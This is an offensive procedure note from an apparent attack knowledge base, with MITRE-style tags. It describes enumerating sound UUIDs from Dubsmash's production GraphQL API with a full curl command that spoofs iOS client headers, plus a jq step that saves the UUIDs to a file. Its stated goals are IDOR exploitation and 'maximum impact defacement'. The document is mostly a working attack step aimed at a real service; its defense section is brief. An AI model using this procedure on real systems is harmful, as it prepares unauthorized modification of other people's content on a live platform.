---
id: proc-fetch-uuids-recommended
tags:
  - recon
  - graphql
  - uuid-enumeration
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-fetch-recommended-sounds]]'
verified: false
platforms:
  - Web
  - Mobile (iOS)
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Gather Victim Host Information]]'
updated_at: '2025-12-14T17:29:28.332Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Gather Victim Host Information]]'
---
# Fetch-Public-Sound-UUIDs-via-RecommendedRichSounds

## Summary

This procedure queries the Dubsmash GraphQL API's RecommendedRichSounds endpoint to retrieve publicly visible sound track UUIDs, enabling identification of targets for unauthorized modifications in subsequent exploits.

## Description

In the Dubsmash mobile app's backend, sound tracks are exposed via a GraphQL query that returns recommended sounds without authentication barriers for UUIDs. This step gathers UUIDs from public recommendations, which can be used in IDOR attacks. The target environment is the web-facing GraphQL API mimicking iOS client requests. Prerequisites include basic HTTP knowledge and a tool like curl. Expected outcomes: A list of UUIDs for exploitation, facilitating large-scale targeting.

## Requirements

1. Internet access to gateway-production.dubsmash.com:443
2. Optional authenticated token for fuller responses, but not required for public UUIDs
3. curl installed for HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement rate limiting on GraphQL queries to prevent bulk enumeration
- Monitor for anomalous query patterns targeting recommendations endpoint
- Obfuscate or remove UUIDs from public responses if not necessary

## Objectives

1. Enumerate publicly accessible sound UUIDs
2. Identify high-visibility tracks for maximum impact defacement
3. Prepare targets for IDOR exploitation

## Instructions

### Step 1: Send RecommendedRichSounds Query

**Context**: Execute the GraphQL query to fetch recommended sounds, extracting UUIDs from the response.

**Command** ([[commands/curl-fetch-recommended-sounds]]):
```bash
curl -i -s -k -X 'POST' -H 'Host: gateway-production.dubsmash.com' -H 'X-Dmac: a252a66f19e030696d2b70ae2cff527b32e9add33475af6ab192595017f6b4ea' -H 'X-Remote-Config-Values: []' -H 'X-Time: 1613160805' -H 'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H 'X-Accept-Content-Language: en_IN' -H 'X-Device-Timezone: 19800' -H 'X-Device-Language: en' -H 'X-Device-Country: IN' -H 'X-Build-Number: 45431' -H 'Content-Length: 1065' -H 'X-App-Version: 5.20.0' -H 'X-Platform: ios' -H 'Connection: close' -H 'Authorization: Bearer xxxxxxxxx' -H 'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H 'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'X-Dmac-Version: 2' -H 'If-None-Match: W/\"7d-SQTt6RA1iQk+sK3Hcqc774a67/I\"' -b '__cfduid=d42d0391d8f2c2d8bf5107a6ceda7c2f61610738889' --data-binary '{"variables":{"next":null},"query":"query RecommendedRichSounds($next: String) {\n recommendations(next: $next, type: SOUND) {\n __typename\n next\n results {\n __typename\n recommendation_identifier\n score\n updated_at\n object {\n __typename\n ... on Sound {\n ...RichSoundFragment\n }\n }\n }\n }\n}\nfragment RichSoundFragment on Sound {\n __typename\n uuid\n created_at\n sound\n name\n waveform_raw_data\n liked\n soundStatus: status\n creator {\n __typename\n ...ContentCreatorFragment\n }\n share_link\n num_likes\n num_videos\n top_videos {\n __typename\n ...TopVideoFragment\n }\n}\nfragment ContentCreatorFragment on User {\n __typename\n username\n uuid\n date_joined\n followed\n has_invite_badge\n badges\n profile_picture\n}\nfragment TopVideoFragment on Video {\n __typename\n uuid\n video_data {\n __typename\n mobile {\n __typename\n thumbnail\n }\n }\n creator {\n __typename\n uuid\n username\n }\n}"}' 'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
```

> This command sends a POST request with iOS-mimicking headers and the GraphQL query body. Parse the JSON response for 'data.recommendations.results[].object.uuid' to extract UUIDs.

### Step 2: Parse and Store UUIDs

**Context**: Extract UUIDs from the response for use in mutations.

**Command** (jq for parsing, assuming installed):
```bash
curl ... | jq '.data.recommendations.results[].object.uuid' > uuids.txt
```

> Expected output: A file with one UUID per line, ready for scripting further attacks.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Gather Victim Host Information]] Gather Victim Host Information

### Sub-Techniques


## Commands Used

- [[commands/curl-fetch-recommended-sounds]]

## Tools Used

- [[tools/curl]]

## Tags

- recon
- graphql
- uuid-enumeration
